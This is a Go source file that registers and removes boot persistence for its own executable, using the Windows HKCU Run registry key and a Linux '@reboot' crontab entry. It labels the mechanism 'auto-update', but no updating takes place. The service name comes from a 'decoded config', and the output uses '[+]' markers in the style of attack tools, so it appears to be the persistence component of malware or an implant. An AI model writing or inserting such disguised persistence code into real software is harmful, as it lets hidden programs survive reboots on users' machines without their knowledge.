package funcs

import (
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"strings"
)

// ServiceLabel is set at init time from the decoded config.
// Default value is used for dev builds only.
var ServiceLabel = "EndpointAutoUpdate"

func InstallAutoUpdater() error {
	exePath, err := os.Executable()
	if err != nil {
		return fmt.Errorf("failed to get executable path: %w", err)
	}

	switch runtime.GOOS {
	case "windows":
		return registerWindowsService(exePath)
	case "linux":
		return registerLinuxService(exePath)
	default:
		return fmt.Errorf("auto-update not implemented for %s", runtime.GOOS)
	}
}

func RemoveAutoUpdater() error {
	switch runtime.GOOS {
	case "windows":
		return removePersistWindows()
	case "linux":
		return removePersistLinux()
	default:
		return fmt.Errorf("auto-update removal not implemented for %s", runtime.GOOS)
	}
}

func registerWindowsService(exePath string) error {
	cmd := exec.Command(
		"reg", "add",
		`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`,
		"/v", ServiceLabel,
		"/t", "REG_SZ",
		"/d", exePath,
		"/f",
	)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("registry add failed: %s - %w", string(output), err)
	}

	fmt.Printf("[+] Auto-update registered (Windows): %s\n", ServiceLabel)
	return nil
}

func removePersistWindows() error {
	cmd := exec.Command(
		"reg", "delete",
		`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`,
		"/v", ServiceLabel,
		"/f",
	)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("registry delete failed: %s - %w", string(output), err)
	}

	fmt.Printf("[-] Auto-update removed (Windows): %s\n", ServiceLabel)
	return nil
}

func registerLinuxService(exePath string) error {
	cmd := exec.Command("crontab", "-l")
	existingCron, _ := cmd.CombinedOutput() // May error if no crontab exists

	cronLine := fmt.Sprintf("@reboot %s &", exePath)

	if strings.Contains(string(existingCron), cronLine) {
		fmt.Println("[*] Auto-update already registered (cron)")
		return nil
	}

	newCron := strings.TrimSpace(string(existingCron)) + "\n" + cronLine + "\n"

	installCmd := exec.Command("crontab", "-")
	installCmd.Stdin = strings.NewReader(newCron)
	output, err := installCmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("crontab install failed: %s - %w", string(output), err)
	}

	fmt.Printf("[+] Auto-update registered (Linux cron): @reboot %s\n", exePath)
	return nil
}

func removePersistLinux() error {
	cmd := exec.Command("crontab", "-l")
	existingCron, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("failed to read crontab: %w", err)
	}

	exePath, err := os.Executable()
	if err != nil {
		return fmt.Errorf("failed to get executable path: %w", err)
	}

	cronLine := fmt.Sprintf("@reboot %s &", exePath)

	lines := strings.Split(string(existingCron), "\n")
	var newLines []string
	for _, line := range lines {
		if strings.TrimSpace(line) != cronLine {
			newLines = append(newLines, line)
		}
	}

	newCron := strings.Join(newLines, "\n")

	installCmd := exec.Command("crontab", "-")
	installCmd.Stdin = strings.NewReader(newCron)
	output, installErr := installCmd.CombinedOutput()
	if installErr != nil {
		return fmt.Errorf("crontab update failed: %s - %w", string(output), installErr)
	}

	fmt.Printf("[-] Auto-update removed (Linux cron): %s\n", ServiceLabel)
	return nil
}
